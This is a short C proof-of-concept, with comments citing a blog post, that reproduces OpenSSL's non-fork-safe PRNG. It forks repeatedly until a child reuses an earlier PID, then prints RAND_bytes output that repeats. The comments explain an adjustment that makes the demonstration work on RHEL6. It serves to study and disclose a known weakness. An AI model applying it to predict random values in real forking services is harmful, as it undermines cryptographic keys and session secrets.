# Original: http://emboss.github.io/blog/2013/08/21/openssl-prng-is-not-really-fork-safe/
# Our patch do this attack relevant for RHel6 and others
# 
# There are two variant:
# 1. Original from Martin
# unsigned char buf[4];
#
# In this case variable buf will be at stack and relate from previous calls, which can be predictable. 
# Original code doesn't work at RHel6 (for example) because stack calls of dump_random() are different between first time and in loop.
# This can be fixed by adding getppid() call before first call of dump_random():
#

#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <openssl/rand.h>

static void dump_random(void)
{
  int i;
  unsigned char buf[4];

  RAND_bytes(buf, sizeof(buf));
  printf("pid=%d ", getpid());
  for (i = 0; i < sizeof(buf); i++) {
            printf("\\x%02x", buf[i]);
        }
  puts("");
}

int main(void)
{
  pid_t pid, xpid;

  /* PRNG needs to be initialized in original process to reproduce */
  RAND_bytes((unsigned char *)&pid, sizeof(pid));

  pid = fork();
  if (pid == 0) {
      getppid();
      dump_random();
      return 0;
  } else if (pid > 0) {
      wait(NULL);

      do {
          xpid = fork();
          if (xpid == 0) {
              if (getpid() == pid)
                  dump_random();
              return 0;
          } else if (xpid > 0) {
              wait(NULL);
          } else {
              perror("fork");
          }
      } while (pid != xpid);
  } else {
      perror("fork");
      return 1;
  }

  return 0;
}